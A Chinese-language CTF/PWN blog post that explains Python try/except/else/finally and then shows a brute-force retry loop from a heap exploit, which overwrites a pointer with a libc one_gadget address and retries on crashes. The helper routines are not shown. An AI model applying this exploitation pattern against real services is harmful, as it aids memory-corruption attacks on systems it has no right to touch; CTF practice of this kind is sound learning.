---
layout: post
title: "Brute-force Scripts"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "PWN"]
description: "Brute-force scripting notes."
source_folder: "PWN"
lang: zh-CN
---
{% raw %}
# 结构
比较常用的一个控制语句是`try / except / else / finally`

它们的执行规则是：先执行 `try`；如果 `try` 里没异常，`except` 跳过；如果发生了匹配的异常，就执行对应的 `except`；`finally` 不管有没有异常，都会在整个 `try` 语句结束前执行。

常用写法：
```python
try:  
    x = int(input("请输入数字: "))  
except ValueError:  
    print("输入不是数字")  
else:  
    print("转换成功:", x)  
finally:  
    print("这句一定会执行")
```

可以这样理解：

- `try`：放可能出错的代码。
- `except`：捕获并处理异常；可以写多个，谁先匹配谁执行，而且一次只会进一个处理分支。
- `else`：只有 **没有发生异常** 时才执行。
- `finally`：通常拿来做清理工作，比如关闭文件、释放资源；即使前面出错(except分支)，`finally` 也会跑。

# 实例：

```python
for i in range(61):
    try:
        init(file, host, port, libc_path)
        pwn()

        data = io.recvrepeat(0.3)   # 把当前能收到的都收掉
        print(repr(data))

        if b"malloc(): memory corruption" in data:
            print(f"[+] hit corruption at {i}")
            io.close()
            break

        io.unrecv(data)

        edit(1, p64(libc.address + one_gadget(libc_path)[2]))
        dele(1)
        iat()

    except EOFError:
        try:
            data = io.recvrepeat(0.2)
            if data:
                print(repr(data))
        except:
            pass
        io.close()
        continue

    except Exception as e:
        print(f"[-] {type(e).__name__}: {e}")
        try:
            data = io.recvrepeat(0.2)
            if data:
                print(repr(data))
        except:
            pass
        io.close()
        continue
```
{% endraw %}
